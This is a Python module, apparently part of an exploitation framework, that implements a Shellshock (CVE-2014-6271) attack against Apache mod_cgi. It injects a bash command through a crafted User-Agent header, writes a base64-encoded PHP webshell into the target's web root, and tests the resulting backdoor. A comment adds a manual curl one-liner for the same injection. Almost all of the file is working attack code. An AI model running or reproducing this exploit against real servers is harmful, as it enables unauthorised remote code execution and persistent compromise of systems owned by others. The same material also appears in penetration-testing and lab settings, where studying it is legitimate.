#######################################################
# shellshock
# CVE-2014-6271
# Metasploit: 
# exploit/multi/http/apache_mod_cgi_bash_env_exec
# 
# This module gives RCE through an apache bash command
# injection vulnerability.
#######################################################

from utils import Exploit
import requests
import random, string, base64
from shells.webshell import WebShell

class ShellShock(Exploit):
    """Class for exploiting the apache mod_cgi shellshock vulnerability"""
    PATH = '/cgi-bin/hello_world.sh'
    user_agent = '''() { :; }; /bin/bash -c "{cmd}"'''

    def __init__(self, server_ip):
        super().__init__(
            os='linux',
            name='Apache2 shellshock',
            description='',
            requirements=['http/80'],
            webserver=False,
            server_ip=server_ip
        )
    
    # Use `curl -H "User-Agent: () { :; }; /bin/bash -c 'whoami'" http://<target>/cgi-bin/hello_world.sh` for manual exploitation
    def attack(self, target: str):
        '''Perform the attack on a target and return a webshell'''
        # Choose random webshell name
        webshell_name = ''.join(random.choice(string.ascii_letters) for _ in range(5)) + '.php'
        
        # One-liner for creating webshell file
        escaped_webshell_code = base64.b64encode(WebShell.LINUX_CODE.encode())
        cmd = f'''echo '{escaped_webshell_code.decode()}' | base64 --decode | tee /var/www/html/drupal/{webshell_name}'''
        
        # Setup attack payload
        headers = {
            'User-Agent': self.user_agent.replace('{cmd}', cmd)
        }
        
        # Send malicious payload with command to create webshell
        try:
            self.message(target, 'Sending malicious request...')
            r = requests.get(f'http://{target}{self.PATH}', headers=headers)
        except OSError:
            self.error(target, 'Could not connect to webserver.')
            return
        except Exception as e:
            self.error(target, 'An unknown error occured: ' + str(e))
            return
        
        # Return webshell
        webshell_path = f'http://{target}/drupal/{webshell_name}'
        webshell = WebShell(target, self.os, webshell_path)
        self.message(target, f'Created webshell at {webshell_path}')

        # Test if webshell works
        if webshell.cmd(''):
           # Return webshell
            self.success(target)
            return webshell
        else:
           self.error(target, 'An unknown error occurred when trying to reach the webshell')
           webshell.kill()
           return
